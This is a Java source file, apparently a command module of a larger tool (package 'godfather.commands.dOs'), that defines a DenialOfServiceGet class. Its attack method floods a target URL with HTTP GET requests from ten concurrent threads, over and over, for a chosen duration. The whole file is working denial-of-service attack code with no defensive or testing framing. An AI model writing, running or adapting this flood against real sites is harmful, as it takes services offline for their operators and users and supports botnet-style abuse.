package godfather.commands.dOs;



import java.util.Date;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ClientConnectionManager;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.PoolingClientConnectionManager;

public class DenialOfServiceGet {
    public static int SIMULTANEOUS = 10;


    public static void attack(String urlToGet, long duration) {
        try {
            SchemeRegistry schemeRegistry = new SchemeRegistry();
            schemeRegistry.register(new Scheme("http", 80, PlainSocketFactory.getSocketFactory()));

            ClientConnectionManager cm = new PoolingClientConnectionManager(schemeRegistry);
            HttpClient httpClient = new DefaultHttpClient(cm);


            System.out.println("GO RUN!!!!: " + urlToGet + "    " + duration);


            // URIs to perform GETs on
            Date st = new Date();
            long end = st.getTime() + duration;
            long now = new Date().getTime();
            while (end > now) {
                // create a thread for each URI
                GetThreadGet[] threads = new GetThreadGet[SIMULTANEOUS];

                for (int i = 0; i < threads.length; i++) {
                    HttpGet httpget = new HttpGet(urlToGet);
                    threads[i] = new GetThreadGet(httpClient, httpget);
                }

                // start the threads
                for (int j = 0; j < threads.length; j++) {
                    threads[j].start();
                }

                // join the threads
                for (int j = 0; j < threads.length; j++) {
                    threads[j].join();
                }
                now = new Date().getTime();
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
